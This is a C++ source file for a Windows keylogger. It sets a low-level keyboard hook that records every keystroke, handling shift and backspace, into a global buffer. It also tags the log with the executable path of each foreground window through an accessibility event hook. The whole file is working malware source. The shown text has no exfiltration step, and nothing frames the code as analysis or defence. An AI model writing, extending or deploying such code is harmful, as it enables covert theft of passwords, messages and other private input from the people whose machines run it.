#include "keylogger.h"

// Global variable.
HWINEVENTHOOK g_hook;

// Initializes COM and sets up the event hook.
//
void HandleWinEvent(HWINEVENTHOOK, DWORD, HWND,
    LONG, LONG,
    DWORD, DWORD);

void InitializeMSAA()
{
    HRESULT hrCoInit = CoInitialize(NULL);
    g_hook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_MENUSTART,  // Range of events (4 to 5).
        NULL,                                          // Handle to DLL.
        HandleWinEvent,                                // The callback.
        0, 0,              // Process and thread IDs of interest (0 = all)
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS); // Flags.
}

// Unhooks the event and shuts down COM.
//
void ShutdownMSAA()
{
    UnhookWinEvent(g_hook);
    CoUninitialize();
}

// Callback function that handles events.
//
void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild,
    DWORD dwEventThread, DWORD dwmsEventTime)
{
    IAccessible* pAcc = NULL;
    VARIANT varChild;
    HRESULT hr = AccessibleObjectFromEvent(hwnd, idObject, idChild, &pAcc, &varChild);
    if ((hr == S_OK) && (pAcc != NULL))
    {
        if (event == EVENT_SYSTEM_FOREGROUND)
        {
            CHAR buffer[MAX_PATH] = { 0 };
            DWORD dwProcId = 0;

            GetWindowThreadProcessId(hwnd, &dwProcId);

            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
            DWORD length = GetModuleFileNameExA((HMODULE)hProc, NULL, buffer, MAX_PATH);
            CloseHandle(hProc);

            //Log(buffer);

            keylogger::buffer.push_back('\n');
            keylogger::buffer.push_back('[');
            for (DWORD i = 0; i < length; i++) {
                keylogger::buffer.push_back(buffer[i]);
            }
            keylogger::buffer.push_back(']');
            keylogger::buffer.push_back('\n');
            //std::cout << buffer << std::endl;
        }
        pAcc->Release();
    }
}

HHOOK hKeyboardHook;
std::vector<char> keylogger::buffer = std::vector<char>();

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        BYTE state[256] = { 0 };
        wchar_t str[2] = { 0 };
        auto keyboard_layout = GetKeyboardLayout(0);

        GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
        GetKeyboardState(state);
        if (ToUnicodeEx(kb->vkCode, kb->scanCode,
            state, str, sizeof(str) / sizeof(*str) - 1, 0, keyboard_layout) > 0)
        {
            if (kb->vkCode == VK_RETURN) 
                keylogger::buffer.push_back('\n');
            else if (kb->vkCode == VK_BACK && keylogger::buffer.size()) 
                keylogger::buffer.pop_back();
            else 
                keylogger::buffer.push_back(str[0]);
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
    keylogger::buffer.reserve(1048);

    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR)lpParm);
    if (!hInstance) return 1;

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);
    InitializeMSAA();
    MessageLoop();

    ShutdownMSAA();
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}
